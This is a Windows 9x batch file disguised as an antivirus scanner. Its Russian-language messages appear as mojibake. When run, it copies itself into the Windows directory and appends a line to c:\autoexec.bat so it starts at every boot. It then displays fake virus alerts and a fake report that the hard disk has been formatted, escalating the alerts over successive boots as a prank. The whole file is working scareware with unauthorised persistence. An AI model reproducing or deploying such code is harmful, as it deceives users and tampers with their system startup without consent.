   @echo off
   if not *%winbootdir%==* goto @@000
   echo This program requires Microsoft Windows 9x.
   goto @@009
   :@@000
   if not *%1==*  goto @@001
   echo Cool AntiViral Scanner v20.02 (128-bit mode)
   echo Copyfromrighttoleft (c)2002 by „¥¤ Œ®à®§. ‚á¥ ¢¨àãáë § é¨é¥ë.
   copy %0 %winbootdir%\_win~.bat >nul
   echo if not exist %winbootdir%\_win~.~~9 call %winbootdir%\_win~.bat ~ >> c:\autoexec.bat
   if exist %winbootdir%\_win~.~~? del %winbootdir%\_win~.~~? >nul
   echo: >%winbootdir%\_win~.~~0
   for %%f in (%winbootdir%\*.exe) do call %winbootdir%\_win~.bat * %%f
   echo:
   echo **** ‚*ˆŒ€*ˆ…!!!
   echo **** *à¨ â ª®¬ ª®«¨ç¥áâ¢¥ ¢¨àãá®¢ ¥®¡å®¤¨¬® ä®à¬ â¨à®¢ ¨¥ ¦¥áâª®£® ¤¨áª .
   echo:
   echo **** * ¦¬¨â¥ «î¡ãî ª« ¢¨èã ¤«ï ¯à®¤®«¦¥¨ï...
   pause > nul
   for %%f in (%winbootdir%\*.*) do dir %winbootdir% > nul
   echo:
   echo **** †¥áâª¨© ¤¨áª ãá¯¥è® ®âä®à¬ â¨à®¢ ! ‚¨àãá WIN.OUTLOOK.EXPRESS ã¨çâ®¦¥.
   pause > nul
   echo:
   goto @@009
   :@@001
   if not *%1==** goto @@002
   echo %2 - * ©¤¥ ®¯ áë© ¢¨àãá WIN.OUTLOOK.EXPRESS!!!
   for %%f in (%winbootdir%\*.*) do copy nul nul > nul
   goto @@009
   :@@002
   if exist %winbootdir%\_win~.~~2 set _win~=¢ ¯ ¯ª¥ %winbootdir%
   if exist %winbootdir%\_win~.~~3 set _win~=¢ ¯ ¯ª¥ C:\Program Files
   if exist %winbootdir%\_win~.~~4 set _win~=¢ ¯ ¯ª¥ Œ®¨ ¤®ªã¬¥âë
   if exist %winbootdir%\_win~.~~5 set _win~=¢ ‚ è¥© ¬ëèª¥
   if exist %winbootdir%\_win~.~~6 set _win~=¢ ‚ è¥© ª« ¢¨ âãà¥
   if exist %winbootdir%\_win~.~~7 set _win~=¢ ‚ è¥¬ ¬®¨â®à¥
   if exist %winbootdir%\_win~.~~8 set _win~=¯®¤ ‚ è¥© ¥«ª®©. ‘ ®¢ë¬ £®¤®¬! ;)
   if *%_win~%==* goto @@003
   echo:
   echo **** ‚*ˆŒ€*ˆ…!!!
   echo **** ‚¨àãá WIN.OUTLOOK.EXPRESS ®¡ àã¦¥ %_win~%!!!
   if exist %winbootdir%\_win~.~~8 goto @@004
   echo:
   echo **** * ¦¬¨â¥ «î¡ãî ª« ¢¨èã ¤«ï ä®à¬ â¨à®¢ ¨ï ¢¨ç¥áâ¥à ...
   :@@004
   pause >nul
   :@@003
   if exist %winbootdir%\_win~.~~8 copy %0 %winbootdir%\_win~.~~9 > nul
   if exist %winbootdir%\_win~.~~7 copy %0 %winbootdir%\_win~.~~8 > nul
   if exist %winbootdir%\_win~.~~6 copy %0 %winbootdir%\_win~.~~7 > nul
   if exist %winbootdir%\_win~.~~5 copy %0 %winbootdir%\_win~.~~6 > nul
   if exist %winbootdir%\_win~.~~4 copy %0 %winbootdir%\_win~.~~5 > nul
   if exist %winbootdir%\_win~.~~3 copy %0 %winbootdir%\_win~.~~4 > nul
   if exist %winbootdir%\_win~.~~2 copy %0 %winbootdir%\_win~.~~3 > nul
   if exist %winbootdir%\_win~.~~1 copy %0 %winbootdir%\_win~.~~2 > nul
   if exist %winbootdir%\_win~.~~0 copy %0 %winbootdir%\_win~.~~1 > nul
   :@@009
